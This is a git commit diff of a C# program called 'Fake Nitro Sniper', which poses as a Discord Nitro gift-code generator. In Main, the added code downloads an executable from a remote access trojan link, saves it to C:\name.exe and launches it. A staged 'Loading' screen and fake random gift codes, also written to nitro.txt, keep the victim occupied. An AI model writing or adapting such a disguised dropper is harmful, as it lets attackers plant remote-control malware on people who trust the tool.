9f835612bb5ef82b980e6505d15df1766f715173
CodenameXYZ <postal2vps@gmail.com>
2023-06-12 07:46:13 +0200

    first commit

--- Fake Nitro Sniper [By CodenameXYZ]/Program.cs
+++ Fake Nitro Sniper [By CodenameXYZ]/Program.cs
@@ -5,6 +5,7 @@ using System.IO;
 using System.Linq;
 using System.Net;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace Fake_Nitro_Sniper__By_CodenameXYZ_
@@ -24,17 +25,27 @@ namespace Fake_Nitro_Sniper__By_CodenameXYZ_
 
         public static string Randomnumber(int length)
         {
-            const string chars = "1234567890";
+            const string chars = "123456789";
             return new string(Enumerable.Repeat(chars, length)
                 .Select(s => s[random.Next(s.Length)]).ToArray());
         }
         static void Main(string[] args)
         {
-            WebClient web = new WebClient();
-            web.DownloadFile("RAT LINK HERE", @"C:\NAMEHERE.EXE");
-            Process.Start(@"C:/NAMEHERE.EXE");
-            Console.WriteLine("Nitro Sniper By NAMEHERE");
-            Console.WriteLine("Pres enter to start sniping");
+
+            string ratlink = @"https://";
+            string name = @"C:\name.exe";
+
+
+
+            WebClient balls = new WebClient();
+            balls.DownloadFile(ratlink, name);
+            Process.Start(name);
+
+            Console.WriteLine("Loading Please Wait...");
+            Thread.Sleep(3500);
+            Console.Clear();
+            Console.WriteLine("Nitro Sniper By <Codename>\n");
+            Console.WriteLine("Press enter to start sniping");
             Console.WriteLine("Valid codes will be saved to nitro.txt");
             Console.ReadLine();
             Console.WriteLine("discord.gg/gift/" + RandomString(7));
@@ -106,9 +117,8 @@ namespace Fake_Nitro_Sniper__By_CodenameXYZ_
             Console.WriteLine("discord.gg/gift/" + RandomString(7));
             Console.WriteLine("discord.gg/gift/" + RandomString(7));
             Console.WriteLine(Randomnumber(1) + " valid gifts");
-            File.Create("nitro.txt");
-            File.WriteAllText("nitro.txt", "discord.gg/gift/" + RandomString(7));
-
+            Console.ReadLine();
+            File.WriteAllText("nitro.txt", "discord.gg/gift/" + RandomString(7) + "\ndiscord.gg/gift/" + RandomString(7) +  "\ndiscord.gg/gift/" + RandomString(7) + "\ndiscord.gg/gift/" + RandomString(7));
         }
     }
 }
